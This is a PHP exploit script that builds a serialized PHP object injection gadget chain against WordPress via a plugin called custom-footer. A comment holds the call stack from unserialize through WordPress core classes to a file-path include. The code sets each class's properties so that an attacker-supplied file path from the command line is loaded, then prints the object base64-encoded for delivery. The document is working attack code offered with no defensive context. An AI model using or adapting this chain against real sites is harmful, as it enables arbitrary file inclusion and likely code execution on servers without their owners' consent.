<?php
/**
 * 
WP_Block_Patterns_Registry->get_content (\wp-includes\class-wp-block-patterns-registry.php:178)
WP_Block_Patterns_Registry->get_registered (\wp-includes\class-wp-block-patterns-registry.php:199)
WP_Block->__construct (\wp-includes\class-wp-block.php:139)
WP_Block_List->offsetGet (\wp-includes\class-wp-block-list.php:96)
WP_HTML_Tag_Processor->class_name_updates_to_attributes_updates (\wp-includes\html-api\class-wp-html-tag-processor.php:2284)
WP_HTML_Tag_Processor->get_updated_html (\wp-includes\html-api\class-wp-html-tag-processor.php:4158)
WP_HTML_Tag_Processor->__toString (\wp-includes\html-api\class-wp-html-tag-processor.php:4126)
in_array (\wp-content\plugins\custom-footer\custom-footer.php:444)
SecureTableGenerator->resetSecurityProperties (\wp-content\plugins\custom-footer\custom-footer.php:444)
SecureTableGenerator->__wakeup (\wp-content\plugins\custom-footer\custom-footer.php:129)
unserialize (\wp-content\plugins\custom-footer\custom-footer.php:610)
index (\wp-content\plugins\custom-footer\custom-footer.php:610)
WP_Hook->apply_filters (\wp-includes\class-wp-hook.php:324)
WP_Hook->do_action (\wp-includes\class-wp-hook.php:348)
do_action (\wp-includes\plugin.php:517)
require_once (\wp-includes\template-loader.php:13)
require (\wp-blog-header.php:19)
{main} (\index.php:17)
 */
 namespace {
    class WP_HTML_Tag_Processor {
        public $html;
        public $parsing_namespace = 'html';
        public $attributes = array();
        public $classname_updates = [1];
        public function __construct( $attributes ) {
            $this->attributes = $attributes;
            $this->html = "foobar";
        }
     }
     class WP_Block_List  {
        public $blocks = ['class' => ['blockName'=> 'test','a' =>'a']];
        public $registry;
        public function __construct(  $registry  ) {
            $this->registry          = $registry;
        }
     }
     final class WP_Block_Patterns_Registry {
        public $registered_patterns;
        public function __construct($payload) {
            $this->registered_patterns = ['test' => ['filePath' => $payload]];
        }
     }
    
     class WP_Query {
        public function __construct($compat_methods) {
            $this->compat_methods = $compat_methods;
        }
     }
     class WP_Theme {
      public function __construct($headers) {
        $this->headers = $headers;
      }
     }

     class SecureTableGenerator
{
    private $data;
    private $headers;
    private $tableClass;
    private $allowedTags;
    
    public function __construct($allowedTags)
    {
      $this->allowedTags = $allowedTags;
    }
}
    $payload = $argv[1];
     $WP_block_patterns_registry = new WP_Block_Patterns_Registry($payload);
     $WP_block_list = new WP_Block_List($WP_block_patterns_registry);
     $WP_HTML_tag_processor = new WP_HTML_Tag_Processor($WP_block_list);
     $SecureTableGenerator = new SecureTableGenerator([$WP_HTML_tag_processor]);

     echo base64_encode(serialize($SecureTableGenerator));
    
}